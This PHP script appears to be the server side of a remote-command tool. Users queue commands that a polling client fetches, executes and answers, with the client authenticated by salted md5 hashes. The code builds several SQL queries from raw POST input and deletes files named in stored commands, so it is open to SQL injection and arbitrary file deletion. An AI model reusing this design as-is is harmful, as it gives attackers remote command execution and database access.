<?php
require_once "libs.php";

if(isset($_COOKIE['userId'])){$userArr=cookieValid()[1];}

if(isset($_POST['isConn'])){
if(time()-strtotime($userArr['lastAct']) < 10){echo "1";};
}

if(isset($_POST['iamconn'])){
$qry = "update userData set lastAct=:time where userId=:usId";
$raw_data = $pdo->prepare($qry);
$raw_data->execute(array(
':time' => $_POST['time'],
':usId' => $_POST['iamconn']
));
}

if(isset($_POST['cmnd']) and str_replace(' ','',$_POST['cmnd']) != ""){
if($_POST['from']=="send")
{
$tim = time();
$qry = "insert into commands (usrId, cmnd, time, exec, `from`) values (:id, :cmd, '".time()."', 0, 'send')";
$raw_data = $pdo->prepare($qry);
$raw_data->execute(array(
':cmd' => $_POST['cmnd'],
':id' => $userArr['userId']
));
}
}

if(isset($_POST['getRepl'])){
$raw_data = $pdo->query("select * from commands where usrId=".$userArr['userId']." and `from`='recv' and cmdId > ".$_POST['getRepl']);
try{
while ($data = $raw_data->fetch(PDO::FETCH_ASSOC))
{
$cmd = $data['cmnd'];
$cId = $data['cmdId'];
echo "||".$cmd."<@0AND0@>".$cId;
}}
catch(\Exception $e){echo "OOOOH YEAAAAH";}
}

if(isset($_POST['getCmnd']))
{
$raw_data = $pdo->query("select * from commands where md5(concat(usrId,'SALTlake'))='".$_POST['getCmnd']."' and `from`='send' and exec=0 and unix_timestamp()-time < 5");
while ($data = $raw_data->fetch(PDO::FETCH_ASSOC))
{
echo(json_encode($data));
}
}

if(isset($_POST['givRepl'])){
$ch=0;
$id=0;

if(isset($_POST['cmdId'])){
$raw_data = $pdo->query("select * from commands where md5(concat(usrId,'SALTlake'))='".$_POST["usrId"]."' and md5(concat(cmdId,'SALTlake'))='".$_POST["cmdId"]."'");}
else{
$raw_data = $pdo->query("select * from commands where md5(concat(usrId,'SALTlake'))='".$_POST["usrId"]."'");}
while ($data = $raw_data->fetch(PDO::FETCH_ASSOC))
{
$ch=1;
$id=$data['usrId'];
}

if($ch==0){exit();}

if(isset($_POST['cmdId'])){
$qry = "update commands set exec=1 where md5(concat(cmdId,'SALTlake'))=:cId";
$raw_data = $pdo->prepare($qry);
$raw_data->execute(array(
':cId' => $_POST['cmdId']
));}

$qry = "insert into commands (usrId, cmnd, time, `from`) values (:uid, :cmd, '".time()."', 'recv')";
$raw_data = $pdo->prepare($qry);
$raw_data->execute(array(
':cmd' => $_POST['givRepl'],
':uid' => $id
));
}

if(isset($_POST['clrCmnd'])){
{

$raw_data = $pdo->query("select cmnd from commands where cmnd like 'img %'");
while ($data = $raw_data->fetch(PDO::FETCH_ASSOC))
{
unlink(substr($data['cmnd'],4));
}
$qry = "delete from commands where usrId=".$userArr['userId'];
$raw_data = $pdo->prepare($qry);
$raw_data->execute(array());
}}

?>
